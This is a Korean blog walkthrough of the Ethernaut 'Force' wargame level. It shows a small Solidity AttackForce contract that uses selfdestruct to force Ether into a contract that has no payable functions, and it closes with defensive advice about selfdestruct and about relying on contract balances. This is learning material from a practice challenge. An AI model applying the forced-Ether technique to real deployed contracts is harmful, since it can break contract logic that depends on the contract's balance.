---
emoji: 🧢
title: (Ethernaut 취약점 7) Force
date: '2022-01-09 18:31:00'
author: 한성원
tags: ethernaut Force vulnerability
categories: 취약점분석
---


# 👋 Force
__Difficulty 5/10__

- 승리 조건
- 코드 분석
- 풀이
순서로 진행 될 것이다.

- - -

## 승리 조건
- Force contract의 balance를 0보다 크게 만든다면 승리한다.

- - -

## 코드 분석
분석은 주석에!

```solidity
// 코드가 없다...? 롸...? 이것은 무엇인가....
contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}
```
- - -
### 풀이를 위한 Setup
[RemixIDE](https://remix.ethereum.org)를 사용한다. 
remix 사용법은 YouTube와 google에 많이 나와있으니 최신것으로 찾아보자!
그리고 docs를 읽어본다면 사용법을 쉽게 익힐 수 있을 것이다.

한 가지 주의할 점은 Force는 remix에서 바로 deploy하는 것이 아니라 ethernauts에서 만든 instance의 주소를 가지고 addressAt을 누르면 된다.
또한 우리는 Rinkeby Network를 사용하고 있으니 ENVIRONMENT를 "Injected Web3"를 선택해주어야 한다.

## 풀이
이 문제에서 우리의 목표는 Force contract의 balance를 0을 초과하게 만드는 것이다.

코드가 없는데 어떻게 Ether를 보내라는 것인가 싶었다.

하지만 contract에 강제로 보낼 수 있는 방법이 존재한다!

바로 [selfdestruct](https://holyhansss.github.io/vulnerability/selfdestruct/selfdestruct/)이다. <= Click selfdestruct 

selfdestruct의 개념을 안다면 이 문제는 매우 쉽게 풀릴 수 있다.

우리가 Force의 balance를 0을 넘게하기 위한 시나리오는 이렇다.
1. ForceAttack contract에 selfdestruct을 사용하는 function과 value를 조금 넣어 deploy한다.
2. Deploy한 contract에서 selfdestruct를 실행시킨다. selfdestruct의 parameter는 Force contract의 주소이다.
3. Force contract는 강제로 Ether를 받게된다.

주석을 통해 ForceAttack contract를 같이 분석 해보자!
```solidity
contract AttackForce {
    // payable을 사용해 Ether를 받을 수 있게 한다.
    constructor () public payable{}
    
    // Force contract의 주소를 넣어 selfdestruct한다.
    function attack(address payable _forceAddress) public {
        selfdestruct(_forceAddress);
    }
}
```
이 코드는 remix IDE에서 만들고 배포한다. 배포할때 value를 0을 초과하게 설정해준다. 이후 Force의 주소와 함께 attack() 실행해주면 공격이 완료된다.

완료 후 ethernaut으로 돌아와 Submit instance를 누르고 조금 기다리면 block이 mine되고, 아래와 같이 뜨며 마무리된다.
```
٩(- ̮̮̃-̃)۶ Well done, You have completed this level!!!
```
- - -

## 마무리
selfdestruct는 항상 조심해야한다. attacker를 통해 공격을 받는 경우도 있지만 contract안에 selfdestruct를 사용하고 실수하여 문제가 일어난 적도 있다. 그렇기 때문에 selfdestruct를 꼭 필요할때 이외에는 사용을 피해보자! 또한 address(this).balance와 같이 selfdestruct에 의해 공격받을 수 있는 것은 사용을 피하도록하자.

- - -
## 기타 정보
- rinkeyb network ether faucet: https://faucets.chain.link/rinkeby
- ethernaut: https://ethernaut.openzeppelin.com/
- remix IDE: https://remix.ethereum.org
- selfdestruct 취약점: https://holyhansss.github.io/vulnerability/selfdestruct/selfdestruct/

```toc

```